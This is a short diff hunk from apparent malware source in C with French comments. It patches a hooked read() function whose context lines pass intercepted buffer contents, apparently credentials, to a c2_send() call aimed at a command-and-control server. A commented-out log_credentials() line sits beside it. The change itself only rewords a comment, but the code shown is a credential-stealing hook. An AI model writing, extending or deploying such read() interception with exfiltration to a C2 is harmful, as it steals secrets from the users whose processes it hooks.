@@ -32,7 +32,7 @@ ssize_t read(int fd, void *buf, size_t count) {
             // Envoyer le contenu complet au C2
             c2_send((char *)buf);
             
-            // Optionnel : log en local
+             //pour log en locale 
             // log_credentials((char*)buf);
         }
     }
